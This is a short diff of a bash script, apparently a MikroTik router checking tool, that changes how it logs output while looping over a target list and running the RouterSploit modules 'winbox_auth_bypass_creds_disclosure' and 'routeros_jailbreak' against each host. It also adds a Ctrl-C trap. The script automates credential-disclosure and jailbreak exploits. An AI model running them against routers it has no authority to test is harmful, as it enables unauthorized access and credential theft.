@@ -143,13 +143,12 @@ rtsploit(){
 	for name in `cat /opt/MCheck/files/tiks_rsf.txt`
 		do
 			#winbox_auth_bypass_creds_disclosure
-			sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}" | tee winbox.log
-			WINSAVE=$(cat winbox.log)
+			WINSAVE=$(sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
 			echo "${WINSAVE}" >> results/RSF/Winbox_${name}.results
-			sudo rm winbox.log
+			echo "${WINSAVE}"
 			# routeros_jailbreak
-			sudo python3.7 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}" | tee jailbreak.log
-			JAIL=$(cat jailbreak.log)
+			JAIL=$(sudo python3.7 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
+			echo "${JAIL}"
 			echo "${JAIL}" >> results/RSF/Jailbreak_${name}.results
 			sudo rm jailbreak.log
 			if [[ -f '/opt/MCheck/results/RSF/*.255.results' ]]; then
@@ -184,6 +183,9 @@ update(){
 }
 #MCheck Start
 main(){
+	# initialise trap to call trap_ctrlc function
+	# when signal 2 (SIGINT) is received
+	trap "trap_ctrlc" 2
 	cd /opt/MCheck
 	echo -e "${BRED}"
 	python3 files/banner.py
